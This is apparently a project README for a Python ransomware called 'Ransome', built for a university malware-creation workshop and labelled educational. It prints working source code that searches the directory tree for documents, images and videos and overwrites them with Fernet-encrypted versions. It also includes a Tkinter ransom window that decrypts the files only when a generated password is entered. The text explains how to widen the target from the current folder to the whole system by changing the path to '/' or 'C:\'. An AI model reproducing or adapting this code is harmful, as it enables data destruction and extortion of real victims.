 <a target="_blank" href="Language" title="Language"><img src="https://img.shields.io/badge/language-python 3+-GREEN"></a>
# Ransome
Ransomeware is a type of malware that has the ablity to encrypt all the files on the device.
This code is written is python 3 for educational purposes only used in the Spyro event workshop malware creation organised by Engineers Spark FST and Google developers Club ENIT.
The code author is cybereagle2001 and the workshop was animated by the author.

## All requirements

tkinter : to create the graphical design 

os  : needed in file access

cryptography.fernet : the encryption algorithm used by the ransome

string : to generate the key

random : generation of the key

## Code explication 
this part of the code presents the main program. The ransome is made for educational purposes so we made sure that we are going to encrypt specified files only in the directory. 

For root,firs,files in os.walk(".") will allow us to search all the files in the directory and the sub directories if we are going to change '.' ==> '/' or 'C:\' depending on the operation system the ransome is going to encrypt all the system and users files.
```markdown
encrypted_ext=(".mp4",".py",".txt",".docx",".odt",".xlsx",".gif",".png",".jpeg",".pdf")

victim_file=[]
for root,dirs,files in os.walk('.'):
    for file in files:
        if (file =="cyber_ran.py"):
            continue
        else:
            file_path,file_ext= os.path.splitext(root+'/'+file)
            if file_ext in encrypted_ext:
                victim_file.append(root+'/'+file)
```

encrypt(victim_file) is the function that I wrote in order to encrypt the stored files using the fernet algorithm for that we need to generate a key and then use it to encrypt the files. To do so we are going to retrieve the content of the files as binary encrypt it and overright the files. thi sprocess is done by this code :

```
def encrypt(victim_file):
    key= Fernet.generate_key()
    for loop in victim_file:
        with open(loop,"rb") as file:
            content= file.read()
        content_enc= Fernet(key).encrypt(content)
        with open(loop,"wb") as file:
            file.write(content_enc)
```

after the encryption process we are going to generate the password that we will need to launch the decryption process to do so I wrote two main functions the first one is password_gen and the second one of decrypt.

Decrypt is going to reverse the encryption algorithm and use the fernet key to decrypt the files content.

the password generator is going to generate a random string. That string will allow the ransome to identify if the victim paied the ransome or not. If the input is equivalent to the value of the generated password it will start the decryption process and this is made by this code 

```
def decrypt(password,key):
    def button_command(password,key):
        key1=entry1.get()
        i=0
        if (key1 == password):
            for loop in victim_file:
                with open(loop,"rb") as file:
                    content= file.read()
                content_dec= Fernet(key).decrypt(content)
                with open(loop,"wb") as file:
                    file.write(content_dec)
            print("good boy you did well!!")
            quit()
        else:
             print("you are hacked!! don't play dump")

    root = Tk()
    root.title("ALL files are encrypted")
    root.geometry('400x200')
    entry1= Entry(root,width=200)
    entry1.pack()
    Button(root,text="decrypt",command=lambda:button_command(password,key)).pack()
    root.mainloop()

def password_gen(N=50):
	return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
```

## Licence 
[MIT](https://choosealicense.com/licenses/mit/) ©cybereagle2001

Original author : cybereagle2001 
